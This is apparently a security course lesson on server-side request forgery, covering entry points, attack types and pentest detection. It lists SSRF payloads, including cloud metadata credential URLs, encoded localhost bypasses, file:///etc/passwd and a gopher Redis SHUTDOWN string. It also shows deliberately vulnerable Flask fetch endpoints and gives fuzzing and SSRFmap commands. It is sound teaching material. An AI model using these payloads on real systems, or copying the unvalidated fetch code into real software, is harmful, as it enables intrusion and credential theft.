# Unit 10: A10 - Server-Side Request Forgery (SSRF) — Topic 1: SSRF Attack Vectors

## Overview

Server-Side Request Forgery (SSRF) occurs when an attacker can **make the server send HTTP requests to arbitrary destinations**, effectively turning the server into a proxy. Since the server often has access to internal resources (databases, cloud metadata, admin panels) that are not accessible from the internet, SSRF can be devastating — enabling access to internal services, cloud credentials, and sensitive data.

---

## 1. How SSRF Works

```
NORMAL FLOW:
  User → Server → External API (intended)

SSRF ATTACK:
  Attacker → Server → Internal Network / Cloud Metadata / Localhost
                 ↑
           Server trusts itself
           Internal network trusts server
           Cloud metadata trusts server's IP

EXAMPLE:
  Application has a "fetch URL" feature:
  
  Normal use:
    POST /api/fetch-preview
    {"url": "https://example.com/article"}
    → Server fetches example.com and returns preview
  
  SSRF attack:
    POST /api/fetch-preview
    {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
    → Server fetches AWS metadata → Returns IAM credentials to attacker!
```

---

## 2. Common SSRF Entry Points

```
VULNERABLE FEATURES:
├── URL preview/unfurling (Slack-like link previews)
├── PDF generation from URL (wkhtmltopdf, Puppeteer)
├── Image/file download from URL
├── Webhook configurations
├── RSS/Atom feed readers
├── Import from URL (CSV, XML, etc.)
├── API integrations with user-supplied URLs
├── SVG/XML processing with external references
├── OAuth callback URL processing
├── DNS lookups triggered by user input
└── Any feature that fetches a user-provided URL
```

---

## 3. SSRF Attack Types

| Type | Description | Target |
|------|-------------|--------|
| **Basic SSRF** | Direct request to internal resource | `http://localhost:8080/admin` |
| **Blind SSRF** | No response returned; detect via timing/DNS | Internal port scanning |
| **Semi-blind** | Error messages reveal internal state | Service discovery |
| **SSRF to RCE** | Chain with internal service vulnerabilities | Redis, Memcached, Docker |
| **SSRF to cloud** | Access cloud metadata APIs | AWS/GCP/Azure credentials |

---

## 4. Basic SSRF Payloads

```
TARGET: LOCALHOST / LOOPBACK
http://localhost/admin
http://127.0.0.1/admin
http://127.0.0.1:8080/
http://[::1]/admin
http://0.0.0.0/admin
http://0x7f000001/
http://2130706433/         (decimal for 127.0.0.1)
http://017700000001/       (octal for 127.0.0.1)
http://127.1/
http://127.0.1/

TARGET: INTERNAL NETWORK
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
http://intranet.company.local/
http://db-server:3306/
http://redis:6379/

TARGET: CLOUD METADATA
http://169.254.169.254/                     (AWS/GCP/Azure)
http://metadata.google.internal/            (GCP)
http://169.254.169.254/metadata/v1/         (DigitalOcean)

TARGET: OTHER PROTOCOLS (if supported)
file:///etc/passwd
dict://localhost:6379/INFO
gopher://localhost:6379/_*1%0d%0a$8%0d%0aSHUTDOWN%0d%0a
ftp://internal-ftp:21/
```

---

## 5. Vulnerable Code Examples

```python
# ❌ VULNERABLE — No URL validation
import requests
from flask import Flask, request, jsonify

@app.route('/api/fetch-preview')
def fetch_preview():
    url = request.args.get('url')
    # Directly fetches ANY URL the user provides!
    response = requests.get(url)
    return jsonify({
        'status': response.status_code,
        'content': response.text[:1000]
    })

# ❌ VULNERABLE — Image proxy
@app.route('/api/image-proxy')
def image_proxy():
    url = request.args.get('src')
    response = requests.get(url)
    return Response(response.content, content_type=response.headers['Content-Type'])

# ❌ VULNERABLE — Webhook registration
@app.route('/api/webhooks', methods=['POST'])
def register_webhook():
    webhook_url = request.json['url']
    # Stores URL and later sends POST requests to it
    # Attacker registers: http://169.254.169.254/latest/meta-data/
    save_webhook(webhook_url)
    return jsonify({'status': 'registered'})
```

---

## 6. SSRF Detection During Pentesting

```bash
# Use Burp Collaborator or similar out-of-band detection
# If the server makes a request to your controlled domain, SSRF exists

# 1. Set up a listener
python3 -m http.server 8888

# 2. Submit your URL in the target application
# URL: http://YOUR_IP:8888/ssrf-test

# 3. Check if the server makes a request
# If you see a connection from the TARGET server → SSRF confirmed!

# Automated tools
# ffuf for SSRF fuzzing
ffuf -u "https://target.com/api/fetch?url=FUZZ" -w ssrf-payloads.txt

# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles
```

---

## Summary Table

| Vector | Example | Risk Level |
|--------|---------|-----------|
| URL preview | Fetch and display link content | High |
| Image proxy | Load image from user-provided URL | High |
| PDF generation | Convert URL to PDF | Critical |
| Webhooks | Server sends requests to registered URL | High |
| XML/SVG parsing | External entity references | Critical |
| Cloud metadata | Access IAM credentials | Critical |

---

## Revision Questions

1. What is SSRF and why is it dangerous in cloud-hosted applications?
2. List five common application features that are vulnerable to SSRF.
3. What is the difference between basic SSRF and blind SSRF?
4. Write five SSRF payloads targeting localhost using different encoding techniques.
5. How do you detect SSRF vulnerabilities during a penetration test?
6. Why do internal services and cloud metadata APIs trust requests from the application server?

---

*Previous: None (First topic in this unit) | Next: [02-cloud-metadata-attacks.md](02-cloud-metadata-attacks.md)*

---

*[Back to README](../README.md)*
